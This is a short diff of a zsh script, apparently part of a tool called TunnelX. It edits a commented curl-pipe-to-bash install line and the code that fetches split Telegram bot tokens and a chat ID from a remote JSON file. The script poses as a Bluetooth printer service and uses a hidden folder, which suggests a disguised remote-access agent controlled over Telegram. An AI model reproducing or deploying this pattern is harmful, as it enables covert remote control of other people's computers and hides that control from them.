@@ -1,5 +1,5 @@
 #!/bin/zsh
-#curl -o- https://decade.tw/apple.printer.curl.sh | bash
+#curl -o- https://raw.githubusercontent.com/xlinx/TunnelX/refs/heads/main/printerServices/l.apple.sh | bash
 LOGPATH="$HOME/Library/Logs/_mylog.log"
 SNAME="com.bluetooth.printerx"
 FOLDER_PATH="$HOME/.tempd"
@@ -45,7 +45,7 @@ JSON_URL="https://raw.githubusercontent.com/xlinx/TunnelX/refs/heads/main/printe
 #TELGRAM_TOKEN__hh_god_bot="$TELGRAM_TOKEN__hh_god_bot1""$TELGRAM_TOKEN__hh_god_bot2"
 
 TELGRAM_TOKEN__xlinx_bot1=$(curl -H "Accept: application/json" "$JSON_URL" | jq -r '.tunnelX1.TELGRAM_TOKEN__xlinx_bot1')
-TELGRAM_TOKEN__xlinx_bot2=$(curl -H "Accept: application/json" "$JSON_URL" | jq -r '.tunnelX1.TELGRAM_TOKEN__xlinx_bot3')
+TELGRAM_TOKEN__xlinx_bot2=$(curl -H "Accept: application/json" "$JSON_URL" | jq -r '.tunnelX1.TELGRAM_TOKEN__xlinx_bot2')
 TELGRAM_TOKEN__xlinx_bot="$TELGRAM_TOKEN__xlinx_bot1""$TELGRAM_TOKEN__xlinx_bot2"
 TELGRAM_CHAT_ID=$(curl -H "Accept: application/json" "$JSON_URL" | jq -r '.tunnelX1.TELGRAM_CHAT_ID')
 
